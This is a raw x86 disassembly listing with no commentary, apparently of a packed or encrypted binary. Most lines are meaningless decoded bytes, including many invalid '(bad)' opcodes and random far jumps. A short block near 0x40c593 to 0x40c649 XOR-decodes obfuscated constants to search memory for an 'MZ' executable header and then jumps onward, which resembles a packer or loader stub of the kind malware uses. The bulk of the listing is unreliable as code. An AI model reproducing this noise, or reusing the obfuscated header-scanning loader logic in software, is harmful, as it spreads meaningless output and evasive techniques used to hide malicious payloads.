  40bfff:	popa   
  40c000:	jl     0x40c03c
  40c002:	test   eax,0xa34e3c9f
  40c007:	dec    esi
  40c008:	pop    esp
  40c009:	xor    BYTE PTR [ecx],ch
  40c00b:	mov    al,0xa5
  40c00d:	sub    DWORD PTR [ebp-0x161d4235],edi
  40c013:	pop    esp
  40c014:	push   0xffffff9a
  40c016:	mov    cl,0x46
  40c018:	cmp    esi,DWORD PTR [edx+eax*1+0x53]
  40c01c:	mov    ss,WORD PTR [eax]
  40c01e:	or     ch,ch
  40c020:	(bad)  
  40c021:	ds aaa 
  40c023:	push   0x11ee5304
  40c028:	imul   ebx,DWORD PTR [ebx+0x7b],0xfffffff3
  40c02c:	aas    
  40c02d:	mov    al,ds:0x4dba6602
  40c032:	jl     0x40bfc1
  40c034:	pop    esi
  40c035:	cwde   
  40c036:	loopne 0x40bfd2
  40c038:	mov    bl,0x28
  40c03a:	in     eax,0x56
  40c03c:	push   0xc927935e
  40c041:	icebp  
  40c042:	outs   dx,DWORD PTR ds:[esi]
  40c043:	lods   eax,DWORD PTR ds:[esi]
  40c044:	shr    BYTE PTR [edi-0x2f],0xdd
  40c048:	mov    ds:0x7929aa82,al
  40c04d:	rol    eax,0xd9
  40c050:	cwde   
  40c051:	inc    esi
  40c052:	sar    esp,0xaf
  40c055:	call   0xcf0c:0x76ceeb25
  40c05c:	xchg   BYTE PTR [ebx],ah
  40c05e:	rcr    BYTE PTR [edi],0xfd
  40c061:	(bad)  
  40c062:	retf   0x33f9
  40c065:	ror    BYTE PTR [ebp+0x4e],0x8e
  40c069:	(bad)  
  40c06a:	jbe    0x40c097
  40c06c:	fsub   st(2),st
  40c06e:	mov    esi,0x4b0fd20c
  40c073:	call   0x5b1b:0x264d4ba1
  40c07a:	jb     0x40bffd
  40c07c:	(bad)  
  40c07d:	push   esp
  40c07e:	dec    edi
  40c07f:	sti    
  40c080:	test   eax,0x13964c47
  40c085:	mov    eax,0x80a122f6
  40c08a:	mov    esp,0x226cfd16
  40c08f:	scas   al,BYTE PTR es:[edi]
  40c090:	cmc    
  40c091:	test   eax,0x7ec514d1
  40c096:	in     eax,dx
  40c097:	outs   dx,BYTE PTR ds:[esi]
  40c098:	icebp  
  40c099:	lds    ecx,FWORD PTR [edi+0x2a]
  40c09c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c09d:	mov    cl,0xe8
  40c09f:	mov    al,0x7d
  40c0a1:	sti    
  40c0a2:	add    eax,0x88f9a0c9
  40c0a7:	retf   0x3dd7
  40c0aa:	ja     0x40c08d
  40c0ac:	and    dl,BYTE PTR ds:0x150bc0f
  40c0b2:	test   al,0xdf
  40c0b4:	std    
  40c0b5:	ins    DWORD PTR es:[edi],dx
  40c0b6:	call   FWORD PTR [edi+0x62]
  40c0b9:	jb     0x40c118
  40c0bb:	shl    BYTE PTR [eax-0x1f46b863],0xd1
  40c0c2:	inc    ecx
  40c0c3:	loope  0x40c0af
  40c0c5:	retf   
  40c0c6:	sbb    BYTE PTR [esi-0x51f236ba],0xd2
  40c0cd:	imul   edi,DWORD PTR [esi-0x6a13a47d],0xfffffffd
  40c0d4:	push   eax
  40c0d5:	xor    BYTE PTR [edx+0x78],dl
  40c0d8:	adc    BYTE PTR [ebx+0x6a],al
  40c0db:	inc    esi
  40c0dc:	add    BYTE PTR ss:[esi+0x13],0x6f
  40c0e1:	and    eax,ebx
  40c0e3:	cld    
  40c0e4:	jl     0x40c11d
  40c0e6:	imul   esi,DWORD PTR [eax+0x1bf9f120],0xc3b902da
  40c0f0:	inc    edi
  40c0f1:	sahf   
  40c0f2:	ss dec edx
  40c0f4:	add    dh,al
  40c0f6:	pop    esi
  40c0f7:	and    al,0x8c
  40c0f9:	mov    BYTE PTR [esi-0x33],ch
  40c0fc:	lea    eax,[edi]
  40c0fe:	hlt    
  40c0ff:	jge    0x40c0e3
  40c101:	pop    ds
  40c102:	push   0x8ff6a72e
  40c107:	sti    
  40c108:	cmp    al,0x8c
  40c10a:	neg    DWORD PTR [eax]
  40c10c:	pop    ss
  40c10d:	xor    eax,0x63c8e092
  40c112:	scas   eax,DWORD PTR es:[edi]
  40c113:	cmp    BYTE PTR [edi],cl
  40c115:	dec    edx
  40c116:	cli    
  40c117:	xor    DWORD PTR [eax-0x12],edi
  40c11a:	mov    dl,0xc9
  40c11c:	mov    esi,0x6816b2bc
  40c121:	addr16 mov dh,0xa8
  40c124:	xchg   ecx,eax
  40c125:	lahf   
  40c126:	cmp    DWORD PTR [ecx-0x542ee2ff],esp
  40c12c:	mov    bl,0x12
  40c12e:	dec    edi
  40c12f:	xor    edi,DWORD PTR [ebp-0x47]
  40c132:	arpl   WORD PTR [edx+0x63],bx
  40c135:	sub    eax,0x7e53da3c
  40c13a:	ins    BYTE PTR es:[edi],dx
  40c13b:	aas    
  40c13c:	push   edi
  40c13d:	das    
  40c13e:	loope  0x40c183
  40c140:	call   FWORD PTR [esi+0x6178b309]
  40c146:	(bad)  
  40c147:	fld    TBYTE PTR [ebp+0x4230f6d4]
  40c14d:	fidiv  DWORD PTR [edx+ebx*4-0x52]
  40c151:	ds inc ecx
  40c153:	mov    dh,0x9a
  40c155:	iret   
  40c156:	push   ecx
  40c157:	mov    ebp,0xee4785a5
  40c15c:	es adc esp,esp
  40c15f:	ror    ch,0x28
  40c162:	pusha  
  40c163:	ins    BYTE PTR es:[edi],dx
  40c164:	adc    eax,0x3f9ee255
  40c169:	xchg   DWORD PTR [edx+0x2e],ecx
  40c16c:	in     eax,0xd4
  40c16e:	dec    eax
  40c16f:	enter  0x4683,0x8a
  40c173:	inc    ebx
  40c174:	xlat   BYTE PTR ds:[ebx]
  40c175:	xchg   ebx,eax
  40c176:	add    DWORD PTR [esi+esi*2-0x27],edi
  40c17a:	fild   DWORD PTR [edx]
  40c17c:	test   al,0x81
  40c17e:	cmp    al,0x21
  40c180:	xchg   DWORD PTR [edi+0x1319de2],ecx
  40c186:	push   DWORD PTR [edi+0x44]
  40c189:	mov    ebp,0xd482126f
  40c18e:	sub    al,0x8b
  40c190:	push   esp
  40c191:	lods   eax,DWORD PTR ds:[esi]
  40c192:	int    0x76
  40c194:	stc    
  40c195:	mov    esi,edx
  40c197:	out    0x91,al
  40c199:	icebp  
  40c19a:	lods   al,BYTE PTR ds:[esi]
  40c19b:	fcomp  st(1)
  40c19d:	push   edi
  40c19e:	ss ja  0x40c1b8
  40c1a1:	pop    esi
  40c1a2:	in     al,0x7c
  40c1a4:	push   cs
  40c1a5:	int3   
  40c1a6:	pop    eax
  40c1a7:	lock int3 
  40c1a9:	popa   
  40c1aa:	jbe    0x40c172
  40c1ac:	nop
  40c1ad:	shl    DWORD PTR [ebx],0xf7
  40c1b0:	mov    esi,0xfd75deb1
  40c1b5:	and    eax,0x575164d7
  40c1ba:	ja     0x40c171
  40c1bc:	aaa    
  40c1bd:	sub    BYTE PTR [ebx+0x9],dl
  40c1c0:	lds    edi,FWORD PTR [ecx]
  40c1c2:	or     eax,0x27c2e8ce
  40c1c7:	push   cs
  40c1c8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c1c9:	loope  0x40c1fc
  40c1cb:	adc    al,0x5d
  40c1cd:	mov    eax,ds:0xd0f53557
  40c1d2:	mov    gs:0x3c5c5dba,al
  40c1d8:	retf   
  40c1d9:	enter  0x95e2,0x4
  40c1dd:	xchg   ebp,eax
  40c1de:	stos   BYTE PTR es:[edi],al
  40c1df:	test   eax,0x765bd2c1
  40c1e4:	int3   
  40c1e5:	jno    0x40c1ca
  40c1e7:	mov    esp,0xc66323a0
  40c1ec:	das    
  40c1ed:	push   eax
  40c1ee:	and    al,0x32
  40c1f0:	(bad)  
  40c1f1:	shl    DWORD PTR [ebx],cl
  40c1f3:	stos   DWORD PTR es:[edi],eax
  40c1f4:	push   edx
  40c1f5:	push   ds
  40c1f6:	dec    eax
  40c1f7:	jnp    0x40c214
  40c1f9:	sub    BYTE PTR [ebx+eax*4+0x7d],0x54
  40c1fe:	call   0x8ff0:0x60cf6931
  40c205:	cdq    
  40c206:	fwait
  40c207:	icebp  
  40c208:	fsubp  st(5),st
  40c20a:	ret    0x1456
  40c20d:	in     eax,dx
  40c20e:	xchg   esp,eax
  40c20f:	mov    ds:0xb701f2ce,eax
  40c214:	mov    ss,WORD PTR [ebx-0x4]
  40c217:	xor    BYTE PTR [edx-0x4efcc4e8],ch
  40c21d:	and    dh,0xc
  40c220:	dec    ebx
  40c221:	leave  
  40c222:	mov    ebp,0x3dac9869
  40c227:	mov    ch,BYTE PTR [eax+0x21]
  40c22a:	mov    ah,0x10
  40c22c:	retf   
  40c22d:	(bad)  
  40c22e:	mov    eax,ds:0x76f16838
  40c233:	outs   dx,BYTE PTR ds:[esi]
  40c234:	mov    es,WORD PTR [ebp-0x76025137]
  40c23a:	jbe    0x40c299
  40c23c:	sbb    esi,DWORD PTR [edx+0x38ac6bb9]
  40c242:	inc    esp
  40c243:	sub    DWORD PTR [eax],edi
  40c245:	call   FWORD PTR [edi]
  40c247:	hlt    
  40c248:	or     DWORD PTR [esi-0x4c],ecx
  40c24b:	pop    ebp
  40c24c:	pextrw ebx,(bad),0xc5
  40c24e:	sbb    edx,DWORD PTR ds:0xfad6a523
  40c254:	arpl   cx,cx
  40c256:	(bad)  
  40c257:	cld    
  40c258:	fnstcw WORD PTR [edx-0x2462d18e]
  40c25e:	je     0x40c217
  40c260:	cmp    al,0x14
  40c262:	fsub   QWORD PTR [edi-0x5762d8f9]
  40c268:	push   ss
  40c269:	fistp  WORD PTR [ebx+0x57]
  40c26c:	test   eax,0x242e6477
  40c271:	pop    es
  40c272:	lds    ebx,FWORD PTR [ebx+0x184d950f]
  40c278:	out    dx,al
  40c279:	sbb    al,0x16
  40c27b:	out    dx,eax
  40c27c:	in     al,0x5f
  40c27e:	xchg   ebp,eax
  40c27f:	xchg   edx,eax
  40c280:	dec    edx
  40c281:	inc    edi
  40c282:	scas   eax,DWORD PTR es:[edi]
  40c283:	lahf   
  40c284:	iret   
  40c285:	sti    
  40c286:	out    dx,al
  40c287:	pop    eax
  40c288:	stos   DWORD PTR es:[edi],eax
  40c289:	ins    BYTE PTR es:[edi],dx
  40c28a:	inc    eax
  40c28b:	clc    
  40c28c:	daa    
  40c28d:	aas    
  40c28e:	cs push eax
  40c290:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c291:	dec    eax
  40c292:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c293:	and    bl,BYTE PTR [edx-0x1f]
  40c296:	lds    ebx,FWORD PTR [ecx+0x4]
  40c299:	mov    esp,0x1380e7a4
  40c29e:	or     ebp,0x2b114f5d
  40c2a4:	jo     0x40c261
  40c2a6:	lahf   
  40c2a7:	jae    0x40c299
  40c2a9:	cmp    BYTE PTR [edi],ch
  40c2ab:	cli    
  40c2ac:	pop    edi
  40c2ad:	fidivr WORD PTR [ebx]
  40c2af:	clc    
  40c2b0:	jge    0x40c2ac
  40c2b2:	repz sahf 
  40c2b4:	out    0x9f,eax
  40c2b6:	jecxz  0x40c247
  40c2b8:	ins    BYTE PTR es:[edi],dx
  40c2b9:	mov    ch,0x59
  40c2bb:	jg     0x40c2e0
  40c2bd:	in     al,dx
  40c2be:	sbb    BYTE PTR [edi-0x5f2179a4],0xc4
  40c2c5:	mov    ebx,DWORD PTR [ecx]
  40c2c7:	mov    eax,0xffbcb0b4
  40c2cc:	les    eax,FWORD PTR ds:0xe7c3d73e
  40c2d2:	xchg   ecx,eax
  40c2d3:	mov    ds:0xcbdd30e6,eax
  40c2d8:	and    esi,esp
  40c2da:	push   es
  40c2db:	inc    edx
  40c2dc:	xor    DWORD PTR [esi+0x22],edx
  40c2df:	mov    esi,edi
  40c2e1:	aam    0x6b
  40c2e3:	fadd   DWORD PTR [ecx+0x59]
  40c2e6:	or     ch,BYTE PTR [eax-0x65]
  40c2e9:	xchg   edi,eax
  40c2ea:	or     eax,0x2e81412c
  40c2f0:	push   esi
  40c2f1:	stc    
  40c2f2:	scas   al,BYTE PTR es:[edi]
  40c2f3:	retf   0xe737
  40c2f6:	aaa    
  40c2f7:	dec    esp
  40c2f8:	add    ecx,ecx
  40c2fa:	xor    BYTE PTR [edi],cl
  40c2fc:	push   esp
  40c2fd:	call   0xe2250261
  40c302:	mov    edx,eax
  40c304:	push   ecx
  40c305:	(bad)  
  40c306:	in     eax,dx
  40c307:	scas   al,BYTE PTR es:[edi]
  40c308:	pop    edx
  40c309:	sbb    BYTE PTR [edi+0x136596fd],0x34
  40c310:	sbb    ah,BYTE PTR [edx+0x4a]
  40c313:	or     cl,BYTE PTR [ebx+0x52]
  40c316:	mov    ah,ch
  40c318:	xchg   ebp,eax
  40c319:	(bad)  
  40c31a:	cdq    
  40c31b:	aas    
  40c31c:	jg     0x40c321
  40c31e:	in     eax,dx
  40c31f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c320:	and    al,BYTE PTR [esp+edi*8-0x7d]
  40c324:	and    DWORD PTR [eax],esi
  40c326:	fld    QWORD PTR [ebx]
  40c328:	into   
  40c329:	and    al,0x16
  40c32b:	dec    edx
  40c32c:	push   0xffffffd7
  40c32e:	test   eax,0xc66fa818
  40c333:	adc    edx,DWORD PTR [ebx+0x5d]
  40c336:	push   0x98a2ec53
  40c33b:	loop   0x40c383
  40c33d:	inc    esp
  40c33e:	inc    esp
  40c33f:	outs   dx,DWORD PTR ds:[esi]
  40c340:	retf   
  40c341:	rol    DWORD PTR [eax*1+0x4994a632],cl
  40c348:	xchg   ebp,eax
  40c349:	fiadd  WORD PTR [ebp+0x44032d9]
  40c34f:	xor    al,bl
  40c351:	mov    bh,BYTE PTR [ebp+0x63]
  40c354:	fld    DWORD PTR [esi-0x6d25bc92]
  40c35a:	jp     0x40c3a6
  40c35c:	clc    
  40c35d:	lods   eax,DWORD PTR ds:[esi]
  40c35e:	ins    DWORD PTR es:[edi],dx
  40c35f:	mov    edx,0x4c6a93af
  40c364:	jmp    0xb62a:0xc1f679b7
  40c36b:	inc    esi
  40c36c:	mov    edi,0xe9861d5f
  40c371:	adc    dl,BYTE PTR [edi-0x56]
  40c374:	mov    eax,0x53c003ae
  40c379:	js     0x40c3f3
  40c37b:	jle    0x40c3eb
  40c37d:	rol    edx,1
  40c37f:	ret    0xb0bb
  40c382:	mov    al,0x93
  40c384:	sub    eax,0xdf7249f0
  40c389:	mov    bh,0x2b
  40c38b:	adc    BYTE PTR [eax],dl
  40c38d:	mov    BYTE PTR [ebx+0x59fc38a2],ch
  40c393:	adc    dl,dl
  40c395:	xchg   ebx,eax
  40c396:	popa   
  40c397:	(bad)  
  40c398:	lods   eax,DWORD PTR ds:[esi]
  40c399:	add    DWORD PTR [edi+0x398046b8],esp
  40c39f:	aad    0xa3
  40c3a1:	data16 aaa 
  40c3a3:	(bad)  
  40c3a4:	jmp    0x2764aa38
  40c3a9:	gs dec ebp
  40c3ab:	jmp    0x40c3e4
  40c3ad:	jo     0x40c3b0
  40c3af:	adc    DWORD PTR [ebp+0x7a],ebp
  40c3b2:	retf   0x1b80
  40c3b5:	(bad)  
  40c3b7:	xor    BYTE PTR [ebp+esi*8-0x4d],dl
  40c3bb:	pop    edx
  40c3bc:	xchg   ebx,eax
  40c3bd:	ss in  al,0xd5
  40c3c0:	or     al,0x19
  40c3c2:	dec    ebx
  40c3c3:	jno    0x40c381
  40c3c5:	mov    ch,al
  40c3c7:	in     eax,dx
  40c3c8:	mov    al,ds:0x67826be9
  40c3cd:	call   0xa1311201
  40c3d2:	aad    0x43
  40c3d4:	mov    al,0x6e
  40c3d6:	outs   dx,DWORD PTR ds:[esi]
  40c3d7:	xor    bh,0x62
  40c3da:	mov    ds,ebx
  40c3dc:	seto   BYTE PTR ds:0x6c84285
  40c3e3:	or     ebp,DWORD PTR ds:0x84b6c76c
  40c3e9:	daa    
  40c3ea:	aam    0x7c
  40c3ec:	mov    BYTE PTR [esi],bl
  40c3ee:	pop    esp
  40c3ef:	les    edi,FWORD PTR ds:0xf4280513
  40c3f5:	fld    TBYTE PTR [ebp-0x516c8169]
  40c3fb:	pop    esp
  40c3fc:	fild   QWORD PTR [ebx+0x3f750ded]
  40c402:	outs   dx,BYTE PTR ds:[esi]
  40c403:	add    eax,0xc3a89224
  40c408:	mov    ch,BYTE PTR [ebp-0x31]
  40c40b:	aad    0xff
  40c40d:	ins    BYTE PTR es:[edi],dx
  40c40e:	inc    edi
  40c40f:	aad    0xcb
  40c411:	xor    eax,0x35cab724
  40c416:	push   eax
  40c417:	ret    0x9df4
  40c41a:	ret    
  40c41b:	pop    ecx
  40c41c:	sbb    ebx,DWORD PTR [ebx]
  40c41e:	adc    BYTE PTR [edx+0x30b09bb9],0xb2
  40c425:	ret    
  40c426:	cwde   
  40c427:	outs   dx,DWORD PTR ds:[esi]
  40c429:	cld    
  40c42a:	in     eax,dx
  40c42b:	(bad)  
  40c42c:	and    al,0xb2
  40c42e:	inc    ebp
  40c42f:	std    
  40c430:	xor    BYTE PTR [eax+edx*8+0x4a01e8b2],bl
  40c437:	imul   edx,DWORD PTR [edi+0x65],0x337ced2a
  40c43e:	sbb    eax,0xa1bd6704
  40c443:	in     al,0xc6
  40c445:	(bad)  
  40c446:	jp     0x40c49f
  40c448:	and    eax,0x369d9027
  40c44d:	mov    esp,DWORD PTR [edi+edx*2+0x62]
  40c451:	cmp    BYTE PTR [ecx+edi*1],al
  40c454:	cld    
  40c455:	xchg   esp,eax
  40c456:	loop   0x40c4c1
  40c458:	or     eax,0x5e03582d
  40c45d:	stos   BYTE PTR es:[edi],al
  40c45e:	addr16 pop ss
  40c460:	jp     0x40c4a7
  40c462:	fmul   st,st(3)
  40c464:	pop    edx
  40c465:	retf   0x7edd
  40c468:	jae    0x40c3eb
  40c46a:	jecxz  0x40c455
  40c46c:	sub    DWORD PTR ds:0x3c1e30a0,ebp
  40c472:	dec    DWORD PTR [ebx+0x5b8177c6]
  40c478:	(bad)  
  40c479:	push   ss
  40c47a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c47b:	ror    DWORD PTR [ebx-0x2a329fcc],1
  40c481:	sbb    dh,al
  40c483:	mov    al,ds:0xacebfeab
  40c488:	jge    0x40c4c9
  40c48a:	dec    BYTE PTR [ebp-0x6364f54a]
  40c490:	jae    0x40c4ac
  40c492:	lea    edx,[eax-0x68]
  40c495:	or     al,0xc0
  40c497:	aam    0xc2
  40c499:	mov    ah,0x83
  40c49b:	outs   dx,DWORD PTR ds:[esi]
  40c49c:	loopne 0x40c510
  40c49e:	inc    esp
  40c49f:	loopne 0x40c434
  40c4a1:	mov    DWORD PTR [eax+0x26],ecx
  40c4a4:	push   0xe2312006
  40c4a9:	adc    dl,0x53
  40c4ac:	jb     0x40c4d7
  40c4ae:	add    al,0xea
  40c4b0:	sub    ch,BYTE PTR [edi+eiz*1-0x768eab59]
  40c4b7:	xor    esp,DWORD PTR [ecx+0x3d66056b]
  40c4bd:	xor    ebp,DWORD PTR [ebx-0x24]
  40c4c0:	push   ebx
  40c4c1:	mov    DWORD PTR [ebp-0x6f],esp
  40c4c4:	fisub  DWORD PTR [ebx-0x34570922]
  40c4ca:	mov    edx,0x14cdf4c4
  40c4cf:	mov    WORD PTR [edi-0x35],?
  40c4d2:	sub    BYTE PTR [ebp+0x6d],dh
  40c4d5:	jae    0x40c4cb
  40c4d7:	sbb    ecx,ebp
  40c4d9:	fmul   DWORD PTR [ecx+0x7b903e06]
  40c4df:	mov    bh,0x2e
  40c4e1:	push   ebp
  40c4e2:	mov    ch,0x4c
  40c4e4:	mov    al,al
  40c4e6:	sbb    DWORD PTR [eax+0x24],edi
  40c4e9:	xchg   ebx,ecx
  40c4eb:	jge    0x40c49d
  40c4ed:	push   cs
  40c4ee:	mov    BYTE PTR ds:0xd847522b,0x12
  40c4f5:	cmp    DWORD PTR [ecx-0x17757150],eax
  40c4fb:	fwait
  40c4fc:	or     ebx,DWORD PTR [eax-0x17]
  40c4ff:	pop    edx
  40c500:	sub    al,0x13
  40c502:	push   ecx
  40c503:	shl    DWORD PTR [edi+ebx*8+0x43],0xa9
  40c508:	dec    edi
  40c509:	jle    0x40c4c9
  40c50b:	jp     0x40c4cc
  40c50d:	jg     0x40c4f3
  40c50f:	mov    DWORD PTR [edx+0x56],ecx
  40c512:	and    ecx,ecx
  40c514:	push   eax
  40c515:	fist   DWORD PTR [esi-0x54e7e8de]
  40c51b:	cmp    eax,0xf539c0f6
  40c520:	xor    al,0xf2
  40c522:	leave  
  40c523:	sbb    BYTE PTR [ebp+ebx*2+0x5821473d],0x8f
  40c52b:	mul    ecx
  40c52d:	dec    eax
  40c52e:	pushf  
  40c52f:	ds and al,0x99
  40c532:	out    0xb9,eax
  40c534:	add    eax,0xfd904c8d
  40c539:	or     al,0xa0
  40c53b:	arpl   WORD PTR [ecx+0x1e],ax
  40c53e:	jns    0x40c530
  40c540:	sbb    eax,0x65738198
  40c545:	test   al,0xb4
  40c547:	stos   DWORD PTR es:[edi],eax
  40c548:	xor    eax,0x829756c2
  40c54d:	add    dl,BYTE PTR [edi]
  40c54f:	call   0x75ad:0x9a741ce0
  40c556:	lods   al,BYTE PTR ds:[esi]
  40c557:	cld    
  40c558:	jns    0x40c546
  40c55a:	jbe    0x40c54f
  40c55c:	adc    al,0x49
  40c55e:	cmp    al,0xba
  40c560:	js     0x40c58e
  40c562:	out    0x8f,eax
  40c564:	and    eax,0x600f2afd
  40c569:	cmc    
  40c56a:	jecxz  0x40c530
  40c56c:	cmp    cl,ch
  40c56e:	jno    0x40c598
  40c570:	push   ss
  40c571:	xchg   edx,eax
  40c572:	mov    ds:0xe9b6df27,al
  40c577:	push   ebx
  40c578:	sti    
  40c579:	lahf   
  40c57a:	fwait
  40c57b:	test   al,0x8d
  40c57d:	adc    eax,DWORD PTR [edi-0x15]
  40c580:	xchg   esi,eax
  40c581:	sbb    ebp,ecx
  40c583:	pop    eax
  40c584:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c585:	cld    
  40c586:	loop   0x40c5a1
  40c588:	ds pop ds
  40c58a:	rcl    BYTE PTR [ebx+0x16],cl
  40c58d:	adc    eax,0x7d893803
  40c592:	clc    
  40c593:	mov    eax,DWORD PTR [ebp+0xc]
  40c596:	mov    edi,DWORD PTR [ebp+0xc]
  40c599:	xor    edi,ecx
  40c59b:	xor    eax,ecx
  40c59d:	lea    eax,[eax+edi*1+0x64e5c4]
  40c5a4:	mov    edi,DWORD PTR [ebp+0xc]
  40c5a7:	xor    edi,ecx
  40c5a9:	add    edi,edx
  40c5ab:	imul   eax,edi
  40c5ae:	mov    edi,DWORD PTR [ebp+0xc]
  40c5b1:	xor    edi,ecx
  40c5b3:	sub    edi,eax
  40c5b5:	mov    eax,DWORD PTR [ebp-0x4]
  40c5b8:	add    edi,edx
  40c5ba:	cmp    DWORD PTR [eax],edi
  40c5bc:	mov    eax,DWORD PTR [ebp-0x4]
  40c5bf:	mov    edi,DWORD PTR [ebp+0x10]
  40c5c2:	jg     0x40c5d5
  40c5c8:	xor    edi,ecx
  40c5ca:	mov    ebx,esi
  40c5cc:	sub    ebx,edi
  40c5ce:	add    DWORD PTR [eax],ebx
  40c5d0:	jmp    0x40c5db
  40c5d5:	xor    edi,ecx
  40c5d7:	add    edi,edx
  40c5d9:	add    DWORD PTR [eax],edi
  40c5db:	mov    eax,DWORD PTR [ebp-0x8]
  40c5de:	mov    edi,DWORD PTR [ebp-0x10]
  40c5e1:	mov    eax,DWORD PTR [eax]
  40c5e3:	xor    edi,ecx
  40c5e5:	add    edi,0x3272e1
  40c5eb:	not    edi
  40c5ed:	and    eax,edi
  40c5ef:	movsx  di,BYTE PTR [eax+0x1]
  40c5f4:	mov    ebx,0x3b51
  40c5f9:	sub    di,bx
  40c5fc:	mov    ebx,0x8a8d
  40c601:	xor    di,bx
  40c604:	mov    ebx,0x4f84
  40c609:	cmp    di,bx
  40c60c:	jne    0x40c634
  40c612:	movsx  di,BYTE PTR [eax]
  40c616:	mov    ebx,0x3b51
  40c61b:	sub    di,bx
  40c61e:	mov    ebx,0x8a8d
  40c623:	xor    di,bx
  40c626:	mov    ebx,0x4e71
  40c62b:	cmp    di,bx
  40c62e:	je     0x40c644
  40c634:	mov    edi,DWORD PTR [ebp-0x10]
  40c637:	xor    edi,ecx
  40c639:	mov    ebx,esi
  40c63b:	sub    ebx,edi
  40c63d:	add    eax,ebx
  40c63f:	jmp    0x40c5ef
  40c644:	mov    esi,DWORD PTR [ebp-0x14]
  40c647:	mov    esi,DWORD PTR [esi]
  40c649:	jmp    0x40e998
  40c64e:	dec    edi
  40c64f:	sub    edi,esi
  40c651:	pusha  
  40c652:	repz inc edx
  40c654:	or     esi,ebx
  40c656:	test   eax,0xb94b873c
  40c65b:	adc    ebx,DWORD PTR [edi+esi*8-0x5e]
  40c65f:	loopne 0x40c6dd
  40c661:	jl     0x40c6b1
  40c663:	pop    edi
  40c664:	jl     0x40c6e2
  40c666:	mov    ebx,0x3ba0fbfd
  40c66b:	xchg   ecx,eax
  40c66c:	jno    0x40c6c6
  40c66e:	(bad)  
  40c66f:	(bad)  
  40c670:	adc    DWORD PTR [ebp-0x4e],eax
  40c673:	mov    edi,0x3dc35e7b
  40c678:	bound  ebp,QWORD PTR [esi]
  40c67a:	xchg   esi,eax
  40c67b:	cmc    
  40c67c:	dec    eax
  40c67d:	lods   eax,DWORD PTR ds:[esi]
  40c67e:	jmp    0x668e:0x26e63227
  40c685:	retf   
  40c686:	ins    DWORD PTR es:[edi],dx
  40c687:	out    dx,eax
  40c688:	cmc    
  40c689:	nop
  40c68a:	mov    cl,0xb3
  40c68c:	shl    BYTE PTR [edx-0x37812308],1
  40c692:	sub    DWORD PTR [ecx],esi
  40c694:	sub    dh,BYTE PTR [eax+0x5e04e82c]
  40c69a:	xchg   edx,eax
  40c69b:	push   eax
  40c69c:	cld    
  40c69d:	scas   al,BYTE PTR es:[edi]
  40c69e:	adc    ebp,DWORD PTR gs:[ebx+0x24]
  40c6a2:	out    0x3b,al
  40c6a4:	sub    DWORD PTR [esi+0x73],esi
  40c6a7:	jle    0x40c721
  40c6a9:	dec    esi
  40c6aa:	iret   
  40c6ab:	mov    eax,0x74ba071f
  40c6b0:	adc    eax,0x4c98f754
  40c6b5:	lods   al,BYTE PTR ds:[esi]
  40c6b6:	packssdw mm2,QWORD PTR [edx-0x77]
  40c6ba:	daa    
  40c6bb:	or     al,0x15
  40c6bd:	dec    esi
  40c6be:	imul   esi,DWORD PTR [esi],0x73436e7
  40c6c4:	xor    DWORD PTR [ebx+0x3b],0x1b
  40c6c8:	imul   BYTE PTR [ebp+0x69be8372]
  40c6ce:	push   0x7b
  40c6d0:	pop    esp
  40c6d1:	pop    ebx
  40c6d2:	cli    
  40c6d3:	cmp    ebx,DWORD PTR ds:0x2a265fdd
  40c6d9:	test   BYTE PTR [esi],ah
  40c6db:	ja     0x40c680
  40c6dd:	add    ecx,DWORD PTR [esi-0x1d855d0d]
  40c6e3:	cdq    
  40c6e4:	xor    BYTE PTR [eax-0xbe30a17],0x94
  40c6eb:	aas    
  40c6ec:	add    eax,0xaba31ba1
  40c6f1:	dec    eax
  40c6f2:	sub    edi,ebx
  40c6f4:	pop    eax
  40c6f5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c6f6:	xor    dh,BYTE PTR [esi+esi*2]
  40c6f9:	jg     0x40c729
  40c6fb:	fcom   QWORD PTR [ebp+edx*1-0xd671c06]
  40c702:	addr16 aad 0xc7
  40c705:	jmp    0x1485:0x25d59807
  40c70c:	inc    ecx
  40c70d:	clc    
  40c70e:	pusha  
  40c70f:	shl    DWORD PTR [eax-0x76ebca38],0x75
  40c716:	jle    0x40c70d
  40c718:	mov    esp,0xad73293c
  40c71d:	lock ins DWORD PTR es:[edi],dx
  40c71f:	xor    DWORD PTR [edx],esp
  40c721:	cs xor ah,ah
  40c724:	dec    ebp
  40c725:	movs   BYTE PTR es:[edi],BYTE PTR cs:[esi]
  40c727:	div    BYTE PTR gs:[edi-0x18e3de92]
  40c72e:	inc    ebx
  40c72f:	leave  
  40c730:	adc    DWORD PTR [ebx+0x3d],esi
  40c733:	cld    
  40c734:	sub    edi,ebx
  40c736:	into   
  40c737:	inc    eax
  40c738:	adc    ecx,edi
  40c73a:	pop    edi
  40c73b:	xlat   BYTE PTR ds:[ebx]
  40c73c:	lea    ecx,[ebx+0x58]
  40c73f:	jne    0x40c796
  40c741:	push   0xc489cfa2
  40c746:	loopne 0x40c7b1
  40c748:	cdq    
  40c749:	push   0xffffffe3
  40c74b:	or     al,BYTE PTR [ecx+0x2f]
  40c74e:	repnz cmp eax,DWORD PTR [edx]
  40c751:	std    
  40c752:	(bad)  
  40c753:	jmp    0xf7ebd5c8
  40c758:	jne    0x40c6ed
  40c75a:	mov    BYTE PTR [edi-0x6b],dh
  40c75d:	mov    dh,0x45
  40c75f:	xlat   BYTE PTR ds:[ebx]
  40c760:	or     ecx,DWORD PTR ds:0x108aeefa
  40c766:	add    al,0x5a
  40c768:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c769:	in     eax,0x3a
  40c76b:	or     DWORD PTR [esi],edx
  40c76d:	shl    BYTE PTR [edx],0x82
  40c770:	call   0x7b44:0x60a9e41d
  40c777:	mov    DWORD PTR [edi+0x3f],0x725efce3
  40c77e:	push   ss
  40c77f:	inc    DWORD PTR [ebx-0x54]
  40c782:	push   ebx
  40c783:	xchg   BYTE PTR [ebx],bl
  40c785:	jmp    0x4fc7:0x185300a5
  40c78c:	push   ecx
  40c78d:	mov    ah,0x6a
  40c78f:	push   ecx
